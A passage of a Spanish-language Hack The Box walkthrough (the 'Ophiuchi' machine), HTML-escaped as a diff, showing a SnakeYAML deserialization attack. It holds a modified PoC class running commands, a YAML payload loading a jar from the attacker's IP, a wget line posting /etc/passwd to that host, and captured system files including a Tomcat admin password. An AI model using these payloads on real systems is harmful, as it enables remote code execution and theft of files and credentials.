+&lt;p&gt;Volviendo a la pagina inicial, realizamos una busqueda de vulnerabilidades relacionadas a YAML en lenguaje Java. Encontramos una vulnerabilidad relacionada a la libreria &lt;code&gt;snakeyaml&lt;/code&gt; en donde obtiene un payload el cual carga codigo para realizar una solicitud a la direccion dada, mediante &lt;code&gt;ScriptEngineManager&lt;/code&gt;, en esta solicitud espera que el archivo o clase (&lt;em&gt;.class&lt;/em&gt;) &lt;code&gt;javax.script.ScriptEngineFactory&lt;/code&gt; exista en la direccion dada, dicha clase es cargada y ejecutada.&lt;/p&gt;
+&lt;p&gt;Utilizando un &lt;a href=&#34;https://github.com/artsploit/yaml-payload&#34;&gt;PoC&lt;/a&gt; que encontramos en Github modificamos &lt;code&gt;AwesomeScriptEngineFactory.java&lt;/code&gt; en donde agregamos el comando ping hacia nuestra maquina.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kn&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sckull&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.script.ScriptEngine&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.script.ScriptEngineFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.IOException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.util.List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;AwesomeScriptEngineFactory&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ScriptEngineFactory&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+
+    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;AwesomeScriptEngineFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;            
+            &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34; ping -c 1 10.10.14.17 &amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;            
+        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+
+    &lt;span class=&#34;o&#34;&gt;[...&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REDACTED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...]&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Compilamos el codigo, además creamos un pequeño servidor de python en la carpeta &lt;code&gt;src&lt;/code&gt; del repositorio, enviamos nuestro payload con nuestra direccion IP.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;javac src/sckull/AwesomeScriptEngineFactory.java &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; jar -cvf yaml-payload.jar -C src/ .
+&lt;span class=&#34;c1&#34;&gt;# python3 -m http.server 80&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;o&#34;&gt;!!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;javax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ScriptEngineManager&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
+  &lt;span class=&#34;o&#34;&gt;!!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;URLClassLoader&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[[&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;!!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;URL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://10.10.14.17/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+  &lt;span class=&#34;o&#34;&gt;]]&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Logramos obtener una solicitud utilizando tcpdump.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/ophiuchi/yaml-payload&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+└─$ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;v&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;... &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; full protocol decode
+listening on tun0, link-type RAW &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Raw IP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, snapshot length &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes
+02:37:56.412303 IP 10.10.10.227 &amp;gt; 10.10.14.17: ICMP &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; request, id 3, seq 1, length &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
+02:37:56.412310 IP 10.10.14.17 &amp;gt; 10.10.10.227: ICMP &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; reply, id 3, seq 1, length &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Intentamos ejecutar diferentes comandos para shell inversa pero ninguno funció. Utilizamos &lt;code&gt;wget&lt;/code&gt; para enumerar la maquina con diferentes archivos del sistem,a incialmente con &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;wget --post-file /etc/passwd http://10.10.14.17:1338/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Con netcat a la escucha logramos obtener el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;, donde observamos algo interesante, el usuario &lt;code&gt;tomcat&lt;/code&gt; tiene su directorio principal en &lt;code&gt;/opt/tomcat&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/ophiuchi&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+└─$ nc -l -p &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt;
+POST / HTTP/1.1
+User-Agent: Wget/1.20.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux-gnu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Accept: */*
+Accept-Encoding: identity
+Host: 10.10.14.17:1338
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: &lt;span class=&#34;m&#34;&gt;1798&lt;/span&gt;
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;admin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+tomcat:x:1001:1001::/opt/tomcat:/bin/false
+admin:x:1000:1000:,,,:/home/admin:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;tomcat-users&#34;&gt;TOMCAT-USERS&lt;/h2&gt;
+&lt;p&gt;Sabiendo esto probablemente el directorio de instalacion de &lt;code&gt;Apache Tomcat&lt;/code&gt; esté en &lt;code&gt;/opt/tomcat&lt;/code&gt; y al igual que la maquina &lt;a href=&#34;https://sckull.github.io/posts/tabby/#http---puerto-8080-&#34;&gt;TABBY - HTB&lt;/a&gt; podriamos obtener el archivo &lt;code&gt;tomcat-users.xml&lt;/code&gt; donde se encuentran las credenciales de acceso al panel de tomcat. Descargamos la misma version &lt;a href=&#34;https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.38/src/&#34;&gt;v9.0.38&lt;/a&gt; de Tomcat para verificar el directorio donde se encuentra el archivo. El archivo lo encontramos en &lt;code&gt;conf/&lt;/code&gt;,  realizamos la solicitud de este archivo el cual logramos encontrar en &lt;code&gt;/opt/tomcat/conf/tomcat-users.xml&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/ophiuchi&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+└─$ nc -l -p &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt;
+POST / HTTP/1.1
+User-Agent: Wget/1.20.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux-gnu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Accept: */*
+Accept-Encoding: identity
+Host: 10.10.14.17:1338
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: &lt;span class=&#34;m&#34;&gt;2234&lt;/span&gt;
+
+&amp;lt;?xml &lt;span class=&#34;nv&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;?&amp;gt;
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+
+&amp;lt;tomcat-users &lt;span class=&#34;nv&#34;&gt;xmlns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://tomcat.apache.org/xml&amp;#34;&lt;/span&gt;
+              xmlns:xsi&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt;
+              xsi:schemaLocation&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://tomcat.apache.org/xml tomcat-users.xsd&amp;#34;&lt;/span&gt;
+        &lt;span class=&#34;nv&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&amp;gt;
+&amp;lt;user &lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;whythereisalimit&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;roles&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;manager-gui,admin-gui&amp;#34;&lt;/span&gt;/&amp;gt;
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+
+&amp;lt;!--
+  &amp;lt;role &lt;span class=&#34;nv&#34;&gt;rolename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tomcat&amp;#34;&lt;/span&gt;/&amp;gt;
+  &amp;lt;role &lt;span class=&#34;nv&#34;&gt;rolename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;role1&amp;#34;&lt;/span&gt;/&amp;gt;
